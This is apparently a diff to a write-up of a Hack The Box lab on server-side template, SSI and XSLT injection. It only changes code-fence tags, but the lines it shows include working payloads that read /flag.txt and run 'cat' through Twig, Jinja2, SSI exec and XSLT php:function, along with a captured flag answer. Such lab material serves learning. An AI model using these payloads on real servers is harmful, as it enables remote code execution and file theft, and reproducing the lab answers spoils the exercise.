@@ -124,7 +124,7 @@ No questions
 
 1. Apply what you learned in this section and identify the Template Engine used by the web application. Provide the name of the template engine as the answer.
 
-```
+```shell
 http://SERVER-IP:PORT/index.php?name={{7*'7'}}
 ```
 
@@ -138,7 +138,7 @@ Answer: `twig`
 
 The payload is 
 
-```jinja2
+```shell
 {{ self.__init__.__globals__.__builtins__.open("/flag.txt").read() }}
 ```
 
@@ -150,7 +150,7 @@ Answer: `HTB{295649e25b4d852185ba34907ec80643}`
 
 The RCE payload is:
 
-```twig
+```shell
 {{ ['cat /flag.txt'] | filter('system') }}
 ```
 
@@ -167,7 +167,7 @@ No questions
 
 The RCE payload is:
 
-```ssi
+```shell
 <!--#exec cmd="cat /flag.txt" -->
 ```
 
@@ -185,7 +185,7 @@ No questions
 
 The RCE payload is:
 
-```xslt
+```shell
 <xsl:value-of select="php:function('system','cat flag.txt')" />
 ```
 
